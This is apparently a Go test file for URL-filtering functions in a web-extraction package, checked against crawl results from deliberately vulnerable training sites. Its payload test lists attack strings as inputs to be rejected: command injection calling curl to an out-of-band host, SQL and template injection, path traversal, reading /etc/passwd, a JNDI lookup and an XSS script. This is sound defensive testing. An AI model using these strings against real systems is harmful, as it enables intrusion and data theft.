package webextract

import "testing"

func TestJunkURL(t *testing.T) {
	for raw, want := range map[string]bool{
		"http://app/rest/basket/NaN":                          true,
		"http://app/api/user/undefined/orders":                true,
		"http://testphp.vulnweb.com/login.ph%E2%80%A6":        true,
		"http://testphp.vulnweb.com/login.php).":              true,
		"http://testphp.vulnweb.com/cart.php.%5B":             true,
		"http://demo.testfire.net/1234567890*~1*/index.jsp":   true,
		"http://app/search/%3Cscript%3Ealert(1)%3C/script%3E": true,
		"http://app/rest/basket/6":                            false,
		"http://app/index.jsp?content=inside_contact.htm":     false,
		"http://app/products/(category)":                      false,
		"http://app/a/b.php":                                  false,
		"http://app/":                                         false,
	} {
		if got := JunkURL(raw); got != want {
			t.Errorf("%s: %v, want %v", raw, got, want)
		}
	}
}

func TestListingSort(t *testing.T) {
	for raw, want := range map[string]bool{
		"http://dvwa/dvwa/css/?C=N;O=D":          true,
		"http://dvwa/dvwa/css/?C=M;O=A":          true,
		"http://dvwa/docs/?C=S&O=D":              true, // nginx fancyindex
		"http://dvwa/docs/?C=D;O=A;F=2;V=1;P=*":  true,
		"http://dvwa/docs/?C=N":                  false,
		"http://dvwa/docs/?C=X;O=D":              false,
		"http://dvwa/docs/?C=N;O=D;page=2":       false,
		"http://app/search?c=n&o=d":              false,
		"http://app/product?C=N&O=D&id=3":        false,
		"http://dvwa/dvwa/css/":                  false,
		"http://dvwa/vulnerabilities/fi/?page=1": false,
	} {
		if got := ListingSort(raw); got != want {
			t.Errorf("%s: %v, want %v", raw, got, want)
		}
		if JunkURL(raw) != want {
			t.Errorf("JunkURL(%s) != %v", raw, want)
		}
	}
}

func TestJunkURLPayloads(t *testing.T) {
	for _, raw := range []string{
		"http://testfire.net/__weave/file/etc/passwd",
		"http://testfire.net/api/v1/license/keys-status/;curl%20d9q3n.oast.live",
		"http://a.test/x?q=%27%20or%201%3D1--",
		"http://a.test/x?name=%7B%7B7*7%7D%7D",
		"http://a.test/redirect?to=javascript:alert(1)",
		"http://a.test/..%2f..%2fwin.ini",
		"http://a.test/x?u=%2524%257Bjndi:ldap://x%257D",
	} {
		if !JunkURL(raw) {
			t.Errorf("JunkURL(%s) = false", raw)
		}
	}
	for _, raw := range []string{
		"http://a.test/rest/products/search?q=apple",
		"http://a.test/index.jsp?content=inside_about.htm",
		"http://a.test/api/v1/license/keys-status",
		"http://a.test/blog/post?postId=3",
	} {
		if JunkURL(raw) {
			t.Errorf("JunkURL(%s) = true", raw)
		}
	}
}

func TestJunkURLDotSegments(t *testing.T) {
	for raw, want := range map[string]bool{
		"http://ginandjuice.shop/..":     true, // an archive kept it as written
		"http://a.test/a/./b":            true,
		"http://a.test/a/%2e%2e/b":       true,
		"http://a.test/.well-known/csaf": false,
		"http://a.test/a/b.c/d":          false,
		"http://a.test/..x/y":            false,
	} {
		if got := JunkURL(raw); got != want {
			t.Errorf("JunkURL(%s) = %v, want %v", raw, got, want)
		}
	}
}

func TestStringNoise(t *testing.T) {
	for p, want := range map[string]bool{
		// Cut out of a parser table or a minified bundle.
		"/pQ": true, "/SQ": true, "/A": true, "http://a.test/Xy": true,
		// A package named after its owner.
		"/juice-shop/juice-shop": true, "/socket.io/socket.io?x=1": true,
		// A word twice is a route like any other.
		"/admin/admin": false, "/api/api": false, "/test/test": false, "/lodash/lodash": false,
		// Short routes, and anything with a longer segment.
		"/v1": false, "/v3": false, "/api": false, "/me": false, "/id": false, "/go": false,
		"/en/us": false, "/en/US": false, "/v2/Me": false, "/aB/c": false, "/s/1": false, "/api/Q": false, "/Users": false, "/IO/stream": false,
		"/admin/users": false, "/a/a": false, "/": false, "/api/api/v1": false,
	} {
		if got := StringNoise(p); got != want {
			t.Errorf("StringNoise(%s) = %v, want %v", p, got, want)
		}
	}
}

func TestVersionPrefix(t *testing.T) {
	for raw, want := range map[string]bool{
		"http://a.test/v3": true, "http://a.test/v1/": true, "http://a.test/api/v2": true, "http://a.test/V2.1": true,
		"http://a.test/v3/users": false, "http://a.test/api": false, "http://a.test/vue": false, "http://a.test/docs/v2": false,
	} {
		if got := VersionPrefix(raw); got != want {
			t.Errorf("VersionPrefix(%s) = %v, want %v", raw, got, want)
		}
	}
}

func TestPayloadKeepsLegitimateURLs(t *testing.T) {
	for _, raw := range []string{
		"http://a.test/loader.js?onload=init",
		"http://a.test/page?x=1&curlang=en",
		"http://a.test/login?next=../dashboard",
		"https://requestbin.example.org/api/items",
		"http://a.test/search?q=rock%20or%20pop",
		"http://a.test/docs/sleep-tracking",
	} {
		if Payload(raw) {
			t.Errorf("Payload(%s) = true", raw)
		}
	}
}
